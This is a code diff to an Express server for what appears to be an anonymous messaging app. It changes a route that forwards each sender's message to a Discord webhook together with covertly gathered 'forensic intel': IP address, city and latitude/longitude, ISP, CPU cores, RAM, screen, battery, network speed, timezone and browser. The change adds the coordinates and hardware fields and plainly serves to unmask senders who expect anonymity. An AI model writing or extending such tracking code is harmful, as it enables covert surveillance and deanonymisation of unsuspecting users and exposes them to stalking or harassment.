@@ -24,19 +24,31 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const DISCORD_WEBHOOK = process.env.WEBHOOK_URL;
 
-// 🕵️ API ROUTE: Receives message and advanced intel
+// 🕵️ API ROUTE: Receives message and high-accuracy forensic intel
 app.post('/api/send', msgLimiter, async (req, res) => {
     const { message, deviceInfo } = req.body;
 
-    // Vercel Edge Intelligence Headers
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
-    const city = req.headers['x-vercel-ip-city'] || "Localhost";
-    const country = req.headers['x-vercel-ip-country'] || "Local";
-    const region = req.headers['x-vercel-ip-country-region'] || "Region";
+    // High-Accuracy Vercel Headers
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Hidden";
+    const city = req.headers['x-vercel-ip-city'] || "Unknown";
+    const country = req.headers['x-vercel-ip-country'] || "Unknown";
+    const region = req.headers['x-vercel-ip-country-region'] || "Unknown";
     const isp = req.headers['x-vercel-ip-as-number'] || "Unknown ISP";
+    const latitude = req.headers['x-vercel-ip-latitude'] || "N/A";
+    const longitude = req.headers['x-vercel-ip-longitude'] || "N/A";
 
     if (!DISCORD_WEBHOOK) return res.status(500).json({ error: "Server Configuration Error" });
     if (!message || message.length < 2) return res.status(400).json({ error: "Message too short!" });
+
+    // Fallback for missing device info
+    const safeDeviceInfo = deviceInfo || {
+        hardware: { cores: "N/A", ram: "N/A", platform: "N/A" },
+        network: { type: "N/A", downlink: "N/A" },
+        display: { res: "N/A", ratio: "N/A" },
+        battery: { level: "N/A", charging: "N/A" },
+        timezone: "N/A",
+        browser: { lang: "N/A", name: "N/A" }
+    };
 
     try {
         const response = await fetch(DISCORD_WEBHOOK, {
@@ -44,18 +56,18 @@ app.post('/api/send', msgLimiter, async (req, res) => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: "🕵️ Ghosty Forensic Report",
-                    description: `**Message:**\n>>> ${message}`,
-                    color: 3447003,
+                    title: "🕵️ High-Accuracy Forensic Intel",
+                    color: 15548997, // Red color for serious intel
                     fields: [
-                        { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: true },
-                        { name: "🌐 Network", value: `IP: ||${ip}||\nISP: ${isp}\nSignal: ${deviceInfo?.network || 'N/A'}`, inline: true },
-                        { name: "📱 Device", value: `${deviceInfo?.platform || 'Unknown'}\n${deviceInfo?.screen || 'N/A'}`, inline: true },
-                        { name: "🔋 Battery", value: `${deviceInfo?.battery?.level || '??'} (${deviceInfo?.battery?.charging || '??'})`, inline: true },
-                        { name: "🕒 Timezone", value: deviceInfo?.timezone || "Unknown", inline: true },
-                        { name: "🗣️ Language", value: deviceInfo?.language || "Unknown", inline: true }
+                        { name: "📝 Message", value: `\`\`\`${message}\`\`\`` },
+                        { name: "📍 Geo-Coordinates", value: `City: ${city}, ${region}, ${country}\nLat: ${latitude}, Lon: ${longitude}`, inline: true },
+                        { name: "🌐 Network & ISP", value: `ISP Code: ${isp}\nType: ${safeDeviceInfo.network.type}\nSpeed: ${safeDeviceInfo.network.downlink}`, inline: true },
+                        { name: "💻 Hardware Intel", value: `CPU: ${safeDeviceInfo.hardware.cores} Cores\nRAM: ${safeDeviceInfo.hardware.ram}\nPlatform: ${safeDeviceInfo.hardware.platform}`, inline: true },
+                        { name: "📱 Screen & Display", value: `Res: ${safeDeviceInfo.display.res}\nRatio: ${safeDeviceInfo.display.ratio}x`, inline: true },
+                        { name: "🔋 Power Status", value: `Level: ${safeDeviceInfo.battery.level}\nCharging: ${safeDeviceInfo.battery.charging}`, inline: true },
+                        { name: "🕒 Senders Time", value: `Timezone: ${safeDeviceInfo.timezone}\nLang: ${safeDeviceInfo.browser.lang}`, inline: true }
                     ],
-                    footer: { text: `User-Agent: ${deviceInfo?.browser?.substring(0, 80)}...` },
+                    footer: { text: `Client IP: ||${ip}|| | User-Agent: ${safeDeviceInfo.browser.name.substring(0, 50)}...` },
                     timestamp: new Date()
                 }]
             })
@@ -64,6 +76,7 @@ app.post('/api/send', msgLimiter, async (req, res) => {
         if (response.ok) res.json({ success: true });
         else throw new Error("Discord Error");
     } catch (err) {
+        console.error("Error sending to Discord:", err);
         res.status(500).json({ error: "Failed to vanish message." });
     }
 });
